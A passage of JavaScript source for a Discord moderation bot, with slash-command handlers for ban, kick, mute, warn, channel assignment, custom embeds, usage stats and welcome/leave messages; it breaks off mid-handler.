      if (member.roles.highest.position >= interaction.member.roles.highest.position) {
        return interaction.reply({
          content: '<:no:1393890945929318542> You cannot ban someone with a higher or equal role.',
          ephemeral: true
        });
      }

      await member.ban({ reason });

      const embed = new EmbedBuilder()
        .setColor(0xef4444)
        .setTitle('🔨 User Banned')
        .setDescription(`**${targetUser.tag}** has been banned from the server.`)
        .addFields(
          { name: 'Moderator', value: `${interaction.user.tag}`, inline: true },
          { name: 'Reason', value: reason, inline: true }
        )
        .setTimestamp()
        .setFooter({
          text: `User ID: ${targetUser.id}`,
          iconURL: interaction.user.displayAvatarURL()
        });

      const reply = await interaction.reply({ embeds: [embed] });

      // Auto-delete after 5 seconds
      setTimeout(async () => {
        try {
          await reply.delete();
        } catch (error) {
          console.error('Error deleting ban message:', error);
        }
      }, 5000);
    } catch (error) {
      console.error('Ban error:', error);
      await interaction.reply({
        content: '<:no:1393890945929318542> Failed to ban user. They may not be in the server or I lack permissions.',
        ephemeral: true
      });
    }
  }

  if (interaction.commandName === 'kick') {
    const targetUser = interaction.options.getUser('user');
    const reason = interaction.options.getString('reason') || 'No reason provided';
    commandStats.kick++;

    // Check if user is owner or has administrator permission
    const isOwnerOrAdmin = interaction.guild.ownerId === interaction.user.id || 
                          interaction.member.permissions.has(PermissionFlagsBits.Administrator);

    if (!isOwnerOrAdmin) {
      return interaction.reply({
        content: '<:no:1393890945929318542> Only server owners and administrators can use this command.',
        ephemeral: true
      });
    }

    // Check if bot has permission
    if (!interaction.guild.members.me.permissions.has(PermissionFlagsBits.KickMembers)) {
      return interaction.reply({
        content: '<:no:1393890945929318542> I don\'t have permission to kick members.',
        ephemeral: true
      });
    }

    try {
      const member = await interaction.guild.members.fetch(targetUser.id);

      // Check if user is trying to kick themselves
      if (targetUser.id === interaction.user.id) {
        return interaction.reply({
          content: '<:no:1393890945929318542> You cannot kick yourself.',
          ephemeral: true
        });
      }

      // Check if user is trying to kick the bot
      if (targetUser.id === client.user.id) {
        return interaction.reply({
          content: '<:no:1393890945929318542> I cannot kick myself.',
          ephemeral: true
        });
      }

      // Check role hierarchy
      if (member.roles.highest.position >= interaction.member.roles.highest.position) {
        return interaction.reply({
          content: '<:no:1393890945929318542> You cannot kick someone with a higher or equal role.',
          ephemeral: true
        });
      }

      await member.kick(reason);

      const embed = new EmbedBuilder()
        .setColor(0xfacc15)
        .setTitle('👢 User Kicked')
        .setDescription(`**${targetUser.tag}** has been kicked from the server.`)
        .addFields(
          { name: 'Moderator', value: `${interaction.user.tag}`, inline: true },
          { name: 'Reason', value: reason, inline: true }
        )
        .setTimestamp()
        .setFooter({
          text: `User ID: ${targetUser.id}`,
          iconURL: interaction.user.displayAvatarURL()
        });

      const reply = await interaction.reply({ embeds: [embed] });

      // Auto-delete after 5 seconds
      setTimeout(async () => {
        try {
          await reply.delete();
        } catch (error) {
          console.error('Error deleting kick message:', error);
        }
      }, 5000);
    } catch (error) {
      console.error('Kick error:', error);
      await interaction.reply({
        content: '<:no:1393890945929318542> Failed to kick user. They may not be in the server or I lack permissions.',
        ephemeral: true
      });
    }
  }

  if (interaction.commandName === 'mute') {
    const targetUser = interaction.options.getUser('user');
    const duration = interaction.options.getInteger('duration');
    const reason = interaction.options.getString('reason') || 'No reason provided';
    commandStats.mute++;

    // Check if user is owner or has administrator permission
    const isOwnerOrAdmin = interaction.guild.ownerId === interaction.user.id || 
                          interaction.member.permissions.has(PermissionFlagsBits.Administrator);

    if (!isOwnerOrAdmin) {
      return interaction.reply({
        content: '<:no:1393890945929318542> Only server owners and administrators can use this command.',
        ephemeral: true
      });
    }

    // Check if bot has permission
    if (!interaction.guild.members.me.permissions.has(PermissionFlagsBits.ModerateMembers)) {
      return interaction.reply({
        content: '<:no:1393890945929318542> I don\'t have permission to timeout members.',
        ephemeral: true
      });
    }

    try {
      const member = await interaction.guild.members.fetch(targetUser.id);

      // Check if user is trying to mute themselves
      if (targetUser.id === interaction.user.id) {
        return interaction.reply({
          content: '<:no:1393890945929318542> You cannot mute yourself.',
        });
      }

      // Check if user is trying to mute the bot
      if (targetUser.id === client.user.id) {
        return interaction.reply({
          content: '<:no:1393890945929318542> I cannot mute myself.',
        });
      }

      // Check role hierarchy
      if (member.roles.highest.position >= interaction.member.roles.highest.position) {
        return interaction.reply({
          content: '<:no:1393890945929318542> You cannot mute someone with a higher or equal role.',
          ephemeral: true
        });
      }

      const timeoutDuration = duration * 60 * 1000; // Convert minutes to milliseconds
      await member.timeout(timeoutDuration, reason);

      const embed = new EmbedBuilder()
        .setColor(0xff6b6b)
        .setTitle('🔇 User Muted')
        .setDescription(`**${targetUser.tag}** has been muted for ${duration} minutes.`)
        .addFields(
          { name: 'Moderator', value: `${interaction.user.tag}`, inline: true },
          { name: 'Duration', value: `${duration} minutes`, inline: true },
          { name: 'Reason', value: reason, inline: false }
        )
        .setTimestamp()
        .setFooter({
          text: `User ID: ${targetUser.id}`,
          iconURL: interaction.user.displayAvatarURL()
        });

      const reply = await interaction.reply({ embeds: [embed] });

      // Auto-delete after 5 seconds
      setTimeout(async () => {
        try {
          await reply.delete();
        } catch (error) {
          console.error('Error deleting mute message:', error);
        }
      }, 5000);
    } catch (error) {
      console.error('Mute error:', error);
      await interaction.reply({
        content: '<:no:1393890945929318542> Failed to mute user. They may not be in the server or I lack permissions.',
        ephemeral: true
      });
    }
  }

  if (interaction.commandName === 'unmute') {
    const targetUser = interaction.options.getUser('user');
    const reason = interaction.options.getString('reason') || 'No reason provided';
    commandStats.unmute++;

    // Check if user is owner or has administrator permission
    const isOwnerOrAdmin = interaction.guild.ownerId === interaction.user.id || 
                          interaction.member.permissions.has(PermissionFlagsBits.Administrator);

    if (!isOwnerOrAdmin) {
      return interaction.reply({
        content: '<:no:1393890945929318542> Only server owners and administrators can use this command.',
        ephemeral: true
      });
    }

    // Check if bot has permission
    if (!interaction.guild.members.me.permissions.has(PermissionFlagsBits.ModerateMembers)) {
      return interaction.reply({
        content: '<:no:1393890945929318542> I don\'t have permission to remove timeouts.',
        ephemeral: true
      });
    }

    try {
      const member = await interaction.guild.members.fetch(targetUser.id);

      if (!member.isCommunicationDisabled()) {
        return interaction.reply({
          content: '<:no:1393890945929318542> This user is not currently muted.',
          ephemeral: true
        });
      }

      await member.timeout(null, reason);

      const embed = new EmbedBuilder()
        .setColor(0x4caf50)
        .setTitle('🔊 User Unmuted')
        .setDescription(`**${targetUser.tag}** has been unmuted.`)
        .addFields(
          { name: 'Moderator', value: `${interaction.user.tag}`, inline: true },
          { name: 'Reason', value: reason, inline: true }
        )
        .setTimestamp()
        .setFooter({
          text: `User ID: ${targetUser.id}`,
          iconURL: interaction.user.displayAvatarURL()
        });

      const reply = await interaction.reply({ embeds: [embed] });

      // Auto-delete after 5 seconds
      setTimeout(async () => {
        try {
          await reply.delete();
        } catch (error) {
          console.error('Error deleting unmute message:', error);
        }
      }, 5000);
    } catch (error) {
      console.error('Unmute error:', error);
      await interaction.reply({
        content: '<:no:1393890945929318542> Failed to unmute user. They may not be in the server or I lack permissions.',
        ephemeral: true
      });
    }
  }

  if (interaction.commandName === 'warn') {
    const targetUser = interaction.options.getUser('user');
    const reason = interaction.options.getString('reason');
    commandStats.warn++;

    // Check if user is owner or has administrator permission
    const isOwnerOrAdmin = interaction.guild.ownerId === interaction.user.id || 
                          interaction.member.permissions.has(PermissionFlagsBits.Administrator);

    if (!isOwnerOrAdmin) {
      return interaction.reply({
        content: '<:no:1393890945929318542> Only server owners and administrators can use this command.',
        ephemeral: true
      });
    }

    try {
      const member = await interaction.guild.members.fetch(targetUser.id);

      // Check if user is trying to warn themselves
      if (targetUser.id === interaction.user.id) {
        return interaction.reply({
          content: '<:no:1393890945929318542> You cannot warn yourself.',
        });
      }

      // Check if user is trying to warn the bot
      if (targetUser.id === client.user.id) {
        return interaction.reply({
          content: '<:no:1393890945929318542> You cannot warn me.',
        });
      }

      // Send DM to the warned user
      try {
        const dmEmbed = new EmbedBuilder()
          .setColor(0xfacc15)
          .setTitle('⚠️ Warning Received')
          .setDescription(`You have received a warning in **${interaction.guild.name}**.`)
          .addFields(
            { name: 'Moderator', value: `${interaction.user.tag}`, inline: true },
            { name: 'Reason', value: reason, inline: false }
          )
          .setTimestamp();

        await targetUser.send({ embeds: [dmEmbed] });
      } catch (dmError) {
        console.log('Could not send DM to user');
      }

      const embed = new EmbedBuilder()
        .setColor(0xfacc15)
        .setTitle('⚠️ User Warned')
        .setDescription(`**${targetUser.tag}** has been warned.`)
        .addFields(
          { name: 'Moderator', value: `${interaction.user.tag}`, inline: true },
          { name: 'Reason', value: reason, inline: false }
        )
        .setTimestamp()
        .setFooter({
          text: `User ID: ${targetUser.id}`,
          iconURL: interaction.user.displayAvatarURL()
        });

      const reply = await interaction.reply({ embeds: [embed] });

      // Auto-delete after 5 seconds
      setTimeout(async () => {
        try {
          await reply.delete();
        } catch (error) {
          console.error('Error deleting warn message:', error);
        }
      }, 5000);
    } catch (error) {
      console.error('Warn error:', error);
      await interaction.reply({
        content: '<:no:1393890945929318542> Failed to warn user. They may not be in the server.',
        ephemeral: true
      });
    }
  }

  if (interaction.commandName === 'commandassign') {
    const mode = interaction.options.getString('mode');
    const targetChannel = interaction.options.getChannel('channel');
    const commandName = interaction.options.getString('command');
    commandStats.commandassign++;

    // Double-check permissions (already checked above, but good practice)
    const isOwnerOrBotOwner = interaction.guild.ownerId === interaction.user.id || isBotOwner(interaction.user.id);
    
    if (!isOwnerOrBotOwner) {
      return interaction.reply({
        content: '<:no:1393890945929318542> Only bot owners and server owners can use this command.',
        ephemeral: true
      });
    }

    if (mode === 'auto') {
      // Auto mode - display all text channels
      const textChannels = interaction.guild.channels.cache
        .filter(channel => channel.type === 0) // Only text channels
        .sort((a, b) => a.position - b.position)
        .map(channel => channel);

      if (textChannels.length === 0) {
        return interaction.reply({
          content: '<:no:1393890945929318542> No text channels found in this server.',
          ephemeral: true
        });
      }

      // Get current assignments for this guild
      const guildAssignments = commandChannelAssignments.get(interaction.guild.id) || {};
      const currentAssignments = guildAssignments[commandName] || [];

      let assignmentText = 'None (usable anywhere)';
      if (currentAssignments.length > 0) {
        assignmentText = currentAssignments.map(id => `<#${id}>`).join(', ');
      }

      const embed = new EmbedBuilder()
        .setColor(0x00d4ff)
        .setTitle(`📋 Available Channels for /${commandName}`)
        .setDescription(`Select any channel below to assign **/${commandName}** to it.\nCurrently assigned to: ${assignmentText}`)
        .setTimestamp()
        .setFooter({
          text: `Guild ID: ${interaction.guild.id} • Total channels: ${textChannels.length}`,
          iconURL: interaction.user.displayAvatarURL()
        });

      // Split channels into chunks to avoid field limit
      const channelsPerField = 10;
      const channelChunks = [];
      for (let i = 0; i < textChannels.length; i += channelsPerField) {
        channelChunks.push(textChannels.slice(i, i + channelsPerField));
      }

      channelChunks.forEach((chunk, index) => {
        const channelList = chunk.map(channel => {
          const isAssigned = currentAssignments.includes(channel.id);
          return `${isAssigned ? '🎯 ' : '📺 '}<#${channel.id}> ${isAssigned ? '(Currently assigned)' : ''}`;
        }).join('\n');

        embed.addFields({
          name: `Channels ${index * channelsPerField + 1}-${Math.min((index + 1) * channelsPerField, textChannels.length)}`,
          value: channelList,
          inline: false
        });
      });

      embed.addFields({
        name: '💡 How to assign',
        value: `Use \`/commandassign mode:assign channel:#channel-name command:${commandName}\` to assign this command to a specific channel.`,
        inline: false
      });

      await interaction.reply({ embeds: [embed] });
    } else {
      // Assign mode - assign to specific channel
      if (!targetChannel) {
        return interaction.reply({
          content: '<:no:1393890945929318542> Please select a channel when using assign mode.',
          ephemeral: true
        });
      }

      // Ensure channel is a text channel
      if (targetChannel.type !== 0) { // 0 = GUILD_TEXT
        return interaction.reply({
          content: '<:no:1393890945929318542> Please select a text channel.',
          ephemeral: true
        });
      }

      // Get or create guild assignments
      let guildAssignments = commandChannelAssignments.get(interaction.guild.id);
      if (!guildAssignments) {
        guildAssignments = {};
        commandChannelAssignments.set(interaction.guild.id, guildAssignments);
      }

      // Initialize or get current assignments for this command
      if (!guildAssignments[commandName]) {
        guildAssignments[commandName] = [];
      }

      // Check if channel is already assigned
      if (guildAssignments[commandName].includes(targetChannel.id)) {
        return interaction.reply({
          content: `<:no:1393890945929318542> Command **/${commandName}** is already assigned to ${targetChannel}.`,
          ephemeral: true
        });
      }

      // Add channel to assignments
      guildAssignments[commandName].push(targetChannel.id);

      const totalAssigned = guildAssignments[commandName].length;
      const allAssignedChannels = guildAssignments[commandName].map(id => `<#${id}>`).join(', ');

      const embed = new EmbedBuilder()
        .setColor(0x00d4ff)
        .setTitle('⚙️ Command Assignment Updated')
        .setDescription(`Command **/${commandName}** has been assigned to ${targetChannel}.`)
        .addFields(
          { name: 'Command', value: `\`/${commandName}\``, inline: true },
          { name: 'New Channel', value: `${targetChannel}`, inline: true },
          { name: 'Total Assigned', value: `${totalAssigned} channel${totalAssigned > 1 ? 's' : ''}`, inline: true },
          { name: 'All Assigned Channels', value: allAssignedChannels, inline: false },
          { name: 'Assigned by', value: `${interaction.user.tag}`, inline: true }
        )
        .setTimestamp()
        .setFooter({
          text: `Guild ID: ${interaction.guild.id}`,
          iconURL: interaction.user.displayAvatarURL()
        });

      await interaction.reply({ embeds: [embed] });
    }
  }

  if (interaction.commandName === 'removecommand') {
    const commandName = interaction.options.getString('command');
    const targetChannel = interaction.options.getChannel('channel');
    commandStats.removecommand++;

    // Double-check permissions (already checked above, but good practice)
    const isOwnerOrBotOwner = interaction.guild.ownerId === interaction.user.id || isBotOwner(interaction.user.id);
    
    if (!isOwnerOrBotOwner) {
      return interaction.reply({
        content: '<:no:1393890945929318542> Only bot owners and server owners can use this command.',
        ephemeral: true
      });
    }

    // Get guild assignments
    let guildAssignments = commandChannelAssignments.get(interaction.guild.id);
    if (!guildAssignments || !guildAssignments[commandName] || guildAssignments[commandName].length === 0) {
      return interaction.reply({
        content: `<:no:1393890945929318542> Command **/${commandName}** is not assigned to any channels.`,
        ephemeral: true
      });
    }

    if (targetChannel) {
      // Remove from specific channel
      if (targetChannel.type !== 0) { // 0 = GUILD_TEXT
        return interaction.reply({
          content: '<:no:1393890945929318542> Please select a text channel.',
          ephemeral: true
        });
      }

      const channelIndex = guildAssignments[commandName].indexOf(targetChannel.id);
      if (channelIndex === -1) {
        return interaction.reply({
          content: `<:no:1393890945929318542> Command **/${commandName}** is not assigned to ${targetChannel}.`,
          ephemeral: true
        });
      }

      // Remove the channel from assignments
      guildAssignments[commandName].splice(channelIndex, 1);

      const remainingAssignments = guildAssignments[commandName].length;
      let remainingText = 'None (usable anywhere)';
      if (remainingAssignments > 0) {
        remainingText = guildAssignments[commandName].map(id => `<#${id}>`).join(', ');
      }

      const embed = new EmbedBuilder()
        .setColor(0xff6b6b)
        .setTitle('🗑️ Command Assignment Removed')
        .setDescription(`Command **/${commandName}** has been removed from ${targetChannel}.`)
        .addFields(
          { name: 'Command', value: `\`/${commandName}\``, inline: true },
          { name: 'Removed from', value: `${targetChannel}`, inline: true },
          { name: 'Remaining Assignments', value: remainingText, inline: false },
          { name: 'Removed by', value: `${interaction.user.tag}`, inline: true }
        )
        .setTimestamp()
        .setFooter({
          text: `Guild ID: ${interaction.guild.id}`,
          iconURL: interaction.user.displayAvatarURL()
        });

      await interaction.reply({ embeds: [embed] });
    } else {
      // Remove from all channels
      const removedCount = guildAssignments[commandName].length;
      const removedChannels = guildAssignments[commandName].map(id => `<#${id}>`).join(', ');
      
      // Clear all assignments
      guildAssignments[commandName] = [];

      const embed = new EmbedBuilder()
        .setColor(0xff6b6b)
        .setTitle('🗑️ All Command Assignments Removed')
        .setDescription(`Command **/${commandName}** has been removed from all assigned channels.`)
        .addFields(
          { name: 'Command', value: `\`/${commandName}\``, inline: true },
          { name: 'Removed from', value: `${removedCount} channel${removedCount > 1 ? 's' : ''}`, inline: true },
          { name: 'Channels', value: removedChannels, inline: false },
          { name: 'Status', value: 'Command is now usable everywhere', inline: true },
          { name: 'Removed by', value: `${interaction.user.tag}`, inline: true }
        )
        .setTimestamp()
        .setFooter({
          text: `Guild ID: ${interaction.guild.id}`,
          iconURL: interaction.user.displayAvatarURL()
        });

      await interaction.reply({ embeds: [embed] });
    }
  }

  if (interaction.commandName === 'embedcreate') {
    const title = interaction.options.getString('title');
    const description = interaction.options.getString('description');
    const colorInput = interaction.options.getString('color');
    const thumbnail = interaction.options.getString('thumbnail');
    const image = interaction.options.getString('image');
    const footer = interaction.options.getString('footer');
    const addTimestamp = interaction.options.getBoolean('timestamp') || false;
    commandStats.embedcreate++;

    // Check if user is owner or has administrator permission
    const isOwnerOrAdmin = interaction.guild.ownerId === interaction.user.id || 
                          interaction.member.permissions.has(PermissionFlagsBits.Administrator);

    if (!isOwnerOrAdmin) {
      return interaction.reply({
        content: '<:no:1393890945929318542> Only server owners and administrators can use this command.',
        ephemeral: true
      });
    }

    // Parse color input
    let color = 0x0099ff; // Default blue color
    if (colorInput) {
      // Handle hex colors
      if (colorInput.startsWith('#')) {
        const hexColor = parseInt(colorInput.slice(1), 16);
        if (!isNaN(hexColor)) {
          color = hexColor;
        }
      } else if (colorInput.startsWith('0x')) {
        const hexColor = parseInt(colorInput, 16);
        if (!isNaN(hexColor)) {
          color = hexColor;
        }
      } else {
        // Handle color names
        const colorNames = {
          'red': 0xff0000,
          'green': 0x00ff00,
          'blue': 0x0000ff,
          'yellow': 0xffff00,
          'orange': 0xffa500,
          'purple': 0x800080,
          'pink': 0xffc0cb,
          'cyan': 0x00ffff,
          'magenta': 0xff00ff,
          'lime': 0x00ff00,
          'black': 0x000000,
          'white': 0xffffff,
          'gray': 0x808080,
          'grey': 0x808080,
          'silver': 0xc0c0c0,
          'gold': 0xffd700,
          'navy': 0x000080,
          'teal': 0x008080,
          'maroon': 0x800000,
          'olive': 0x808000
        };
        
        const lowerColor = colorInput.toLowerCase();
        if (colorNames[lowerColor]) {
          color = colorNames[lowerColor];
        }
      }
    }

    try {
      const embed = new EmbedBuilder()
        .setColor(color)
        .setTitle(title)
        .setDescription(description);

      // Add optional elements
      if (thumbnail) {
        try {
          new URL(thumbnail); // Validate URL
          embed.setThumbnail(thumbnail);
        } catch {
          return interaction.reply({
            content: '<:no:1393890945929318542> Invalid thumbnail URL provided.',
            ephemeral: true
          });
        }
      }

      if (image) {
        try {
          new URL(image); // Validate URL
          embed.setImage(image);
        } catch {
          return interaction.reply({
            content: '<:no:1393890945929318542> Invalid image URL provided.',
            ephemeral: true
          });
        }
      }

      if (footer) {
        embed.setFooter({
          text: footer,
          iconURL: interaction.user.displayAvatarURL()
        });
      }

      if (addTimestamp) {
        embed.setTimestamp();
      }

      // Send confirmation message
      const confirmEmbed = new EmbedBuilder()
        .setColor(0x00ff88)
        .setTitle('<:yes:1393890949960306719> Embed Created Successfully!')
        .setDescription('Your custom embed has been posted below.')
        .addFields(
          { name: '🎨 Creator', value: `${interaction.user.tag}`, inline: true },
          { name: '📝 Title', value: title, inline: true },
          { name: '🎯 Channel', value: `${interaction.channel}`, inline: true }
        )
        .setTimestamp()
        .setFooter({
          text: `Created by ${interaction.user.tag}`,
          iconURL: interaction.user.displayAvatarURL()
        });

      await interaction.reply({ embeds: [confirmEmbed] });
      await interaction.followUp({ embeds: [embed] });

    } catch (error) {
      console.error('Embed creation error:', error);
      await interaction.reply({
        content: '<:no:1393890945929318542> Failed to create embed. Please check your inputs and try again.',
        ephemeral: true
      });
    }
  }

  if (interaction.commandName === 'stats') {
    const targetUser = interaction.options.getUser('user') || interaction.user;
    commandStats.stats++;

    // Get user stats from the database
    const guildUserStats = userStats.get(interaction.guild.id);
    if (!guildUserStats || !guildUserStats.has(targetUser.id)) {
      return interaction.reply({
        content: `<:no:1393890945929318542> No command usage data found for ${targetUser === interaction.user ? 'you' : targetUser.username}.`,
        ephemeral: true
      });
    }

    const userData = guildUserStats.get(targetUser.id);
    const totalCommands = Object.values(userData.commands).reduce((a, b) => a + b, 0);
    
    // Get member to check join date
    let joinDate = userData.joinDate;
    try {
      const member = await interaction.guild.members.fetch(targetUser.id);
      joinDate = member.joinedTimestamp;
    } catch (error) {
      // Use stored join date if member fetch fails
    }

    // Sort commands by usage
    const sortedCommands = Object.entries(userData.commands)
      .sort(([,a], [,b]) => b - a)
      .slice(0, 10); // Top 10 commands

    const embed = new EmbedBuilder()
      .setColor(0x0ea5e9)
      .setTitle(`📊 ${targetUser === interaction.user ? 'Your' : `${targetUser.username}'s`} Command Statistics`)
      .setDescription(`Statistical overview for ${targetUser.tag}`)
      .setThumbnail(targetUser.displayAvatarURL())
      .addFields(
        { name: '📈 Total Commands Used', value: `${totalCommands}`, inline: true },
        { name: '⏰ Last Command Used', value: userData.lastUsed ? `<t:${Math.floor(userData.lastUsed / 1000)}:R>` : 'Never', inline: true },
        { name: '📅 Joined Server', value: `<t:${Math.floor(joinDate / 1000)}:F>`, inline: true }
      )
      .setTimestamp()
      .setFooter({
        text: `Requested by ${interaction.user.tag}`,
        iconURL: interaction.user.displayAvatarURL()
      });

    if (sortedCommands.length > 0) {
      const commandList = sortedCommands
        .map(([cmd, count]) => `\`/${cmd}\` - ${count} time${count > 1 ? 's' : ''}`)
        .join('\n');
      
      embed.addFields({
        name: '🎯 Most Used Commands',
        value: commandList,
        inline: false
      });
    } else {
      embed.addFields({
        name: '🎯 Most Used Commands',
        value: 'No commands used yet',
        inline: false
      });
    }

    await interaction.reply({ embeds: [embed] });
  }

  if (interaction.commandName === 'setwelcome') {
    const channel = interaction.options.getChannel('channel');
    const message = interaction.options.getString('message');
    const mode = interaction.options.getString('mode') || 'single';
    commandStats.setwelcome++;

    if (channel.type !== 0) { // Must be text channel
      return interaction.reply({
        content: '<:no:1393890945929318542> Please select a text channel.',
        ephemeral: true
      });
    }

    // Get or create guild settings
    let settings = guildSettings.get(interaction.guild.id);
    if (!settings) {
      settings = {};
      guildSettings.set(interaction.guild.id, settings);
    }

    settings.welcomeChannel = channel.id;

    // Initialize welcomeMessages array if it doesn't exist
    if (!settings.welcomeMessages) {
      settings.welcomeMessages = ['Welcome {user} to {server}! You are the {membercount} member!'];
    }

    let embed;

    switch (mode) {
      case 'single':
        if (message) {
          settings.welcomeMessages = [message];
        }
        
        const exampleMessage = (message || settings.welcomeMessages[0])
          .replace(/{user}/g, `<@${interaction.user.id}>`)
          .replace(/{username}/g, interaction.user.username)
          .replace(/{server}/g, `**${interaction.guild.name}**`)
          .replace(/{membercount}/g, `**343rd**`);

        const exampleEmbed = new EmbedBuilder()
          .setColor(0x00ff88)
          .setDescription(exampleMessage)
          .setThumbnail(interaction.user.displayAvatarURL({ size: 128 }))
          .setTimestamp()
          .setFooter({
            text: `Welcome to ${interaction.guild.name}`,
            iconURL: interaction.guild.iconURL()
          });

        embed = new EmbedBuilder()
          .setColor(0x00ff88)
          .setTitle('👋 Welcome Message Settings Updated')
          .setDescription('Welcome message configuration has been saved. Here\'s how it will look:')
          .addFields(
            { name: 'Channel', value: `${channel}`, inline: true },
            { name: 'Mode', value: 'Single message', inline: true },
            { name: 'Variables', value: '`{user}` - Mentions the user\n`{username}` - User\'s name\n`{server}` - Server name\n`{membercount}` - Member count with ordinal suffix', inline: false }
          )
          .setTimestamp()
          .setFooter({
            text: `Set by ${interaction.user.tag}`,
            iconURL: interaction.user.displayAvatarURL()
          });

        await interaction.reply({ embeds: [embed] });
        await interaction.followUp({ embeds: [exampleEmbed] });
        break;

      case 'add':
        if (!message) {
          return interaction.reply({
            content: '<:no:1393890945929318542> Please provide a message or messages to add to the rotation (separate multiple messages with commas).',
            ephemeral: true
          });
        }

        // Split by comma and clean up each message
        const messagesToAdd = message.split(',').map(msg => msg.trim()).filter(msg => msg.length > 0);
        
        if (messagesToAdd.length === 0) {
          return interaction.reply({
            content: '<:no:1393890945929318542> No valid messages found. Please provide at least one message.',
            ephemeral: true
          });
        }

        // Add all messages to the array
        settings.welcomeMessages.push(...messagesToAdd);

        const messageList = messagesToAdd.map((msg, index) => `**${index + 1}.** ${msg}`).join('\n');

        embed = new EmbedBuilder()
          .setColor(0x00ff88)
          .setTitle('👋 Welcome Messages Added')
          .setDescription(`Added ${messagesToAdd.length} new welcome message${messagesToAdd.length > 1 ? 's' : ''} to rotation. You now have ${settings.welcomeMessages.length} total messages.`)
          .addFields(
            { name: 'Channel', value: `${channel}`, inline: true },
            { name: 'Total Messages', value: `${settings.welcomeMessages.length}`, inline: true },
            { name: `New Message${messagesToAdd.length > 1 ? 's' : ''}`, value: messageList, inline: false }
          )
          .setTimestamp()
          .setFooter({
            text: `Added by ${interaction.user.tag}`,
            iconURL: interaction.user.displayAvatarURL()
          });

        await interaction.reply({ embeds: [embed] });
        break;

      case 'list':
        const welcomeMessagesList = settings.welcomeMessages.map((msg, index) => `**${index + 1}.** ${msg}`).join('\n\n');
        
        embed = new EmbedBuilder()
          .setColor(0x0ea5e9)
          .setTitle('👋 Welcome Messages List')
          .setDescription(welcomeMessagesList || 'No welcome messages configured.')
          .addFields(
            { name: 'Channel', value: `${channel}`, inline: true },
            { name: 'Total Messages', value: `${settings.welcomeMessages.length}`, inline: true },
            { name: 'Rotation', value: 'Random selection on each join', inline: true }
          )
          .setTimestamp()
          .setFooter({
            text: `Requested by ${interaction.user.tag}`,
            iconURL: interaction.user.displayAvatarURL()
          });

        await interaction.reply({ embeds: [embed] });
        break;

      case 'clear':
        settings.welcomeMessages = ['Welcome {user} to {server}! You are the {membercount} member!'];
        
        embed = new EmbedBuilder()
          .setColor(0xff6b6b)
          .setTitle('👋 Welcome Messages Cleared')
          .setDescription('All welcome messages have been cleared and reset to default.')
          .addFields(
            { name: 'Channel', value: `${channel}`, inline: true },
            { name: 'Status', value: 'Reset to default message', inline: true }
          )
          .setTimestamp()
          .setFooter({
            text: `Cleared by ${interaction.user.tag}`,
            iconURL: interaction.user.displayAvatarURL()
          });

        await interaction.reply({ embeds: [embed] });
        break;
    }
  }

  if (interaction.commandName === 'setleave') {
    const channel = interaction.options.getChannel('channel');
    const message = interaction.options.getString('message');
    const mode = interaction.options.getString('mode') || 'single';
    commandStats.setleave++;

    if (channel.type !== 0) { // Must be text channel
      return interaction.reply({
        content: '<:no:1393890945929318542> Please select a text channel.',
        ephemeral: true
      });
    }

    // Get or create guild settings
    let settings = guildSettings.get(interaction.guild.id);
    if (!settings) {
      settings = {};
      guildSettings.set(interaction.guild.id, settings);
    }

    settings.leaveChannel = channel.id;

    // Initialize leaveMessages array if it doesn't exist
    if (!settings.leaveMessages) {
      settings.leaveMessages = ['{username} has left {server}. We\'ll miss you! 👋'];
    }

    let embed;

    switch (mode) {
      case 'single':
        if (message) {
          settings.leaveMessages = [message];
        }
        
        const exampleMessage = (message || settings.leaveMessages[0])
          .replace(/{username}/g, `**${interaction.user.username}**`)
          .replace(/{server}/g, `**${interaction.guild.name}**`)
          .replace(/{membercount}/g, `**342nd**`);

        const exampleEmbed = new EmbedBuilder()
          .setColor(0xff6b6b)
          .setDescription(exampleMessage)
          .setThumbnail(interaction.user.displayAvatarURL({ size: 128 }))
          .setTimestamp()
          .setFooter({
            text: `Goodbye from ${interaction.guild.name}`,
            iconURL: interaction.guild.iconURL()
          });

        embed = new EmbedBuilder()
          .setColor(0xff6b6b)
          .setTitle('👋 Leave Message Settings Updated')
          .setDescription('Leave message configuration has been saved. Here\'s how it will look:')
          .addFields(
            { name: 'Channel', value: `${channel}`, inline: true },
            { name: 'Mode', value: 'Single message', inline: true },
            { name: 'Variables', value: '`{username}` - User\'s name\n`{server}` - Server name\n`{membercount}` - Member count with ordinal suffix', inline: false }
          )
          .setTimestamp()
          .setFooter({
            text: `Set by ${interaction.user.tag}`,
            iconURL: interaction.user.displayAvatarURL()
          });

        await interaction.reply({ embeds: [embed] });
        await interaction.followUp({ embeds: [exampleEmbed] });
        break;

      case 'add':
        if (!message) {
          return interaction.reply({
            content: '<:no:1393890945929318542> Please provide a message or messages to add to the rotation (separate multiple messages with commas).',
            ephemeral: true
          });
        }

        // Split by comma and clean up each message
        const messagesToAdd = message.split(',').map(msg => msg.trim()).filter(msg => msg.length > 0);
        
        if (messagesToAdd.length === 0) {
          return interaction.reply({
            content: '<:no:1393890945929318542> No valid messages found. Please provide at least one message.',
            ephemeral: true
          });
        }

        // Add all messages to the array
        settings.leaveMessages.push(...messagesToAdd);

        const messageList = messagesToAdd.map((msg, index) => `**${index + 1}.** ${msg}`).join('\n');

        embed = new EmbedBuilder()
          .setColor(0xff6b6b)
          .setTitle('👋 Leave Messages Added')
          .setDescription(`Added ${messagesToAdd.length} new leave message${messagesToAdd.length > 1 ? 's' : ''} to rotation. You now have ${settings.leaveMessages.length} total messages.`)
          .addFields(
            { name: 'Channel', value: `${channel}`, inline: true },
            { name: 'Total Messages', value: `${settings.leaveMessages.length}`, inline: true },
            { name: `New Message${messagesToAdd.length > 1 ? 's' : ''}`, value: messageList, inline: false }
          )
          .setTimestamp()
          .setFooter({
            text: `Added by ${interaction.user.tag}`,
            iconURL: interaction.user.displayAvatarURL()
          });

        await interaction.reply({ embeds: [embed] });
        break;

      case 'list':
        const leaveMessagesList = settings.leaveMessages.map((msg, index) => `**${index + 1}.** ${msg}`).join('\n\n');
        
        embed = new EmbedBuilder()
          .setColor(0x0ea5e9)
          .setTitle('👋 Leave Messages List')
          .setDescription(leaveMessagesList || 'No leave messages configured.')
          .addFields(
            { name: 'Channel', value: `${channel}`, inline: true },
            { name: 'Total Messages', value: `${settings.leaveMessages.length}`, inline: true },
            { name: 'Rotation', value: 'Random selection on each leave', inline: true }
          )
          .setTimestamp()
          .setFooter({
            text: `Requested by ${interaction.user.tag}`,
            iconURL: interaction.user.displayAvatarURL()
          });

        await interaction.reply({ embeds: [embed] });
        break;

      case 'clear':
